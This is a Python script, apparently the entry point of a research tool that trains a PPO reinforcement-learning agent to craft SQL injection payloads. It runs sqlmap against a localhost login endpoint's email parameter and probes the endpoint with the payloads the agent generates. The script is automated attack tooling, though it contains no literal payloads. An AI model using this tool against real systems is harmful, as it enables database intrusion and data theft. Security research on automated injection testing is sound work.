#!/usr/local/bin/python
import sys
from typing import Set
import numpy as np
import os

from lib.configuration import Configuration
from lib.injected_request import send_request
from lib.model.payload import Payload

from .hyperparameters import BATCH_SIZE, MAX_EPISODE_EXTENSION, STATE_SIZE, ACTION_SIZE, \
    EMBEDDING_DIM, INITIAL_EPISODE_LENGTH
from .model.ppo_actor_critic import PPOActorCritic
from .model.ppo import PPO
from .network.sqlmap_runner import SqlmapRunner
from .nlp.token_parser import TokenParser
from .sql_parser import sql_data_service, training_data_generator
from .sql_parser.schema_parser import get_column_tokens_from_schema, get_table_tokens_from_schema
from .nlp.token_embedder import TokenEmbedder
from .model.environment import Environment

import tensorflow as tf

# GPU private mode allows for optimisation. Thread count of two recommended but we set
# it to three.Environment variable documentation from:
# https://www.tensorflow.org/guide/gpu_performance_analysis#2_gpu_host_thread_contention
#
# TensorFlow environment variable setting solution by Prerak Mody from Performance Summary
# section in:
# https://towardsdatascience.com/profiling-in-tensorflow-2-x-576f5700124a
os.environ['TF_GPU_THREAD_MODE'] = 'gpu_private'
os.environ['TF_GPU_THREAD_COUNT'] = '3'

os.environ['TF_XLA_FLAGS'] = '--tf_xla_enable_xla_devices'

# Multi-GPU Keras environment variable from official Keras tutorial:
# https://keras.io/guides/distributed_training_with_tensorflow/
os.environ['KERAS_BACKEND'] = 'tensorflow'

# Print GPU devices visible to TensorFlow based on official guide:
# https://www.tensorflow.org/api_docs/python/tf/config/experimental/get_device_details
print('Visible GPU devices:')

gpu_devices = tf.config.list_physical_devices('GPU')
for device in gpu_devices:
  details = tf.config.experimental.get_device_details(device)
  print(details.get('device_name', 'Unknown GPU'))

tf.config.optimizer.set_jit(True)

# TODO: Use argparse instead.
args = sys.argv[1:]

run_sqlmap = '--no-run-sqlmap' not in args
use_cache = '--from-cache' in args
profile = '--profile' in args

embedding_data_rows = None

try:
    for arg in args:
        if arg.startswith('--embedding-dataset-count='):
            embedding_data_rows = int(arg.split('--embedding-dataset-count=')[1])
            break
except:
    pass

#
#
# !
# ! TODO: IMPORTANT: Add legal disclaimer.
# !
#
#

visible_chars = [chr(i) for i in range(32, 127)]

config = Configuration(
    open_url='http://localhost:3000/rest/user/login',
    headers={},
    cookie='',
)

sqlmap = SqlmapRunner(config.open_url, vulernable_param='email', default_vulnerable_param_value='email=test@test.com')

if run_sqlmap:
    print('Running sqlmap...')
    
    sqlmap.run(
        headers=config.headers,
        cookie=config.cookie,
    )
    
    print('Attempted payloads gathered from sqlmap.')
else:
    print('Skipping running sqlmap...')

schema = sql_data_service.load_schema()

columns = get_column_tokens_from_schema(schema)

# NON-SYSTEM TABLE NAMES CAN BE CASE SENSITIVE (MySQL...)!!!!!
#
# Column names don't appear to be. This could be because they are not
# part of the file naming system (unlike table names depending on DBMS).
tables = get_table_tokens_from_schema(schema)

sql_tokens = sql_data_service.load_sql_tokens()
token_blacklist = sql_data_service.load_sql_blacklist()


dictionary = sql_tokens + tables + columns + visible_chars + ['']

# Remove duplicate schema column names and ASCII characters from dictionary.
dictionary = list(set(dictionary))

dictionary.sort(key=len, reverse=True)

print('DICTIONARY:')
print('\n'.join(dictionary))

token_parser = TokenParser(dictionary, token_blacklist)

if use_cache:
    print('Using cached embeddings...')
    embeddings = sql_data_service.load_embeddings()
else:
    embedding_training_data = training_data_generator.generate_training_data(
        schema=schema,
        max_length=embedding_data_rows,
        token_parser=token_parser,
    )

    # TODO: Retrieve cached embeddings (if already generated) if dictionary and
    # embedding examples are unchanged.
    
    print('Running token embedder...')
    
    embeddings = TokenEmbedder(EMBEDDING_DIM).learn_embeddings(
        training_data=embedding_training_data,
        vocabulary_length=len(dictionary),
        batch_size=1024,
        buffer_size=10000,
    )
    
    print('Embeddings learned.')

    sql_data_service.save_embeddings(embeddings.numpy().tolist())


def attack_callback(payload: Payload):
    return send_request(
        payload=str(payload),
        config=config,
    )


print('Gathering expected responses...')

expected_responses: Set[str] = set()

# ASCII from '0' to 'Z' and 'a' to 'Z'.
for token in [chr(code) for code in range(48, 91)] + [chr(code) for code in range(97, 123)]:
    print(f'Passing expected token \'{token}\'...')

    response = attack_callback(Payload(
        payload=token,
        payload_tokens={token},
    ))
    
    expected_responses.add(response)

print('Expected responses gathered.')

environments = [
    Environment(
        dictionary=dictionary,
        action_size=ACTION_SIZE,
        state_size=STATE_SIZE,
        attack_callback=attack_callback,
        expected_responses=expected_responses,
        frames_per_episode=INITIAL_EPISODE_LENGTH,
        max_episode_extension=MAX_EPISODE_EXTENSION,
    ) for _ in range(BATCH_SIZE + 1)
]

demonstration_environment = environments[0]
environments = environments[1:]

state: np.ndarray

def print_decoded_injections(encoded_payloads):
    '''
    Use to verify that the predefined encoded injection list is correctly
    encoded.
    '''
    print('DEMONSTRATION PAYLOADS:')
    for injection in encoded_payloads:
        decoded = [dictionary[i] for i in injection]
        print(''.join(decoded))

def main():
    dictionary_length = len(dictionary)

    with open(f'{os.path.dirname(__file__)}/../injections_demonstration.txt', 'r') as f:
        payloads = f.read().splitlines()
    f.close()

    encoded_demonstration = token_parser.parse(payloads)

    for encoded_payload in encoded_demonstration:
        assert(len(encoded_payload) <= ACTION_SIZE)

    # Pad with empty token.
    encoded_demonstration = [[payload[i] if i < len(payload) else dictionary_length - 1 for i in range(ACTION_SIZE)] for payload in encoded_demonstration]

    print_decoded_injections(encoded_demonstration)
    
    demonstration_actions = tf.convert_to_tensor(encoded_demonstration)

    actor_critic = PPOActorCritic(
        dictionary_length=len(dictionary),
        action_size=ACTION_SIZE,
        state_size=STATE_SIZE,
        embedding_size=EMBEDDING_DIM,
        embeddings=embeddings,
    )
    
    ppo = PPO(
        actor_critic,
        environments=environments,
    )

    ppo.run(
        demonstration_environment=demonstration_environment,
        demonstration_actions=demonstration_actions
    )


if __name__ == '__main__':
    main()